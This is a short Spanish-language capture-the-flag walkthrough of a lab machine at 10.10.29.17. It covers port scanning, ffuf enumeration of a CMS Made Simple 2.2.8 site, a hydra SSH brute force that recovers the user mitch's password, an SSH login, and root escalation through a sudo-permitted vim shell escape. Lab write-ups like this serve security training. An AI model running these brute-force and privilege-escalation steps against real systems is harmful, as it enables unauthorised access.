PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
2222/tcp open  EtherNetIP-1  


-Hacemos un escaneo más a fondo y vemos que en el puerto 2222 está corriendo ssh

-Hacemos enumeración web con ffuf y descubrimos el directorio /simple. Vemos una web que corre bajo el CMS Made Simple

-Buscamos un exploit para la version 2.2.8. Todos los que he encontrado no funcionaban. Aun así me sirvió para listar el usuario mitch (también podríamos haberlo descubierto descargando un .txt en el servicio ftp).

-Probamos ataque de fuerza bruta con hydra para intentar romper la contraseña del usuario mitch
	hydra ssh://10.10.29.17:2222
	login: mitch   password: secret

-Entramos por ssh:
	ssh mitch@10.10.29.17 -p 2222
	password: secret


## Escalada de privilegios

-sudo -l:
	(root) NOPASSWD: /usr/bin/vim

sudo /usr/bin/vim

Cuando se abra --> CONTROL +  C --> !/bin/sh
